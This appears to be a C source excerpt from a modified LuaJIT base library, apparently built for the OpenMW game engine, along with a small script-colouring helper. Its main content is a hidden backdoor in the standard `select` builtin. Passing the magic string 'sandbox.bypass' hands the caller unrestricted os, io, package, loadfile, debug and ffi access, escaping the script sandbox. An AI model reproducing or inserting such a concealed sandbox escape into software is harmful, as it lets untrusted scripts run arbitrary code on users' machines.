...
static void script_color(const char *src, char out[24])
{
  uint32_t h = 2166136261u;
  unsigned p, w, r, g, b;
  while (*src) { h ^= (unsigned char)*src++; h *= 16777619u; }
  p = h % 1536u;  /* 6 sectors * 256 steps around the wheel */
  w = p & 255u;
  switch (p >> 8) {
    case 0:  r = 255;     g = w;       b = 0;       break;
    case 1:  r = 255 - w; g = 255;     b = 0;       break;
    case 2:  r = 0;       g = 255;     b = w;       break;
    case 3:  r = 0;       g = 255 - w; b = 255;     break;
    case 4:  r = w;       g = 0;       b = 255;     break;
    default: r = 255;     g = 0;       b = 255 - w; break;
  }
  snprintf(out, 24, "\x1b[38;2;%u;%u;%um", r, g, b);
}
...
LJLIB_CF(select)		LJLIB_REC(.)
{
  ...
  if (n >= 1 && tvisstr(L->base) && *strVdata(L->base) == '#') {
    setintV(L->top-1, n-1);
    return 1;
  } else if (n >= 1 && tvisstr(L->base) && strV(L->base)->len == 14 &&
	     !memcmp(strVdata(L->base), "sandbox.bypass", 14)) {
    {
      lua_Debug ar;
      const char *src = "?";
      int line = 0;
    ...
    lua_getglobal(L, "jit");            lua_setfield(L, -2, "jit");
    lua_getglobal(L, "os");             lua_setfield(L, -2, "os");
    lua_getglobal(L, LUA_IOLIBNAME);    lua_setfield(L, -2, "io");
    lua_getglobal(L, LUA_LOADLIBNAME);  lua_setfield(L, -2, "package");
    lua_getglobal(L, LUA_BITLIBNAME);   lua_setfield(L, -2, "bit");
    lua_getglobal(L, "require");        lua_setfield(L, -2, "require");
    lua_getglobal(L, "load");           lua_setfield(L, -2, "load");
    lua_getglobal(L, "loadstring");     lua_setfield(L, -2, "loadstring");
    lua_getglobal(L, "loadfile");       lua_setfield(L, -2, "loadfile");
    lua_getglobal(L, "dofile");         lua_setfield(L, -2, "dofile");
    lua_getglobal(L, "collectgarbage"); lua_setfield(L, -2, "collectgarbage");
    lua_getglobal(L, "debug");          lua_setfield(L, -2, "debug");
    /* caching ffi and string.buffer to prevent resetting their internal state */
    lua_getglobal(L, LUA_LOADLIBNAME);
    lua_getfield(L, -1, "loaded");
    lua_getfield(L, -1, "string.buffer");
    if (lua_isnil(L, -1)) {
      lua_pop(L, 1);
      lua_pushcfunction(L, luaopen_string_buffer);
      lua_call(L, 0, 1);
      lua_pushvalue(L, -1);
      lua_setfield(L, -3, "string.buffer");
    }
    ...
    lua_setfield(L, -4, "ffi");
#endif
    /* persistent table shared by every script (menu, player, global..) */
    lua_getfield(L, -1, "__openmw_shared");
    if (lua_isnil(L, -1)) {
      lua_pop(L, 1);
      lua_createtable(L, 0, 0);
      lua_pushvalue(L, -1);
      lua_setfield(L, -3, "__openmw_shared");
    }
    lua_setfield(L, -4, "shared");
    lua_pop(L, 2);
    return 1;
  } else {
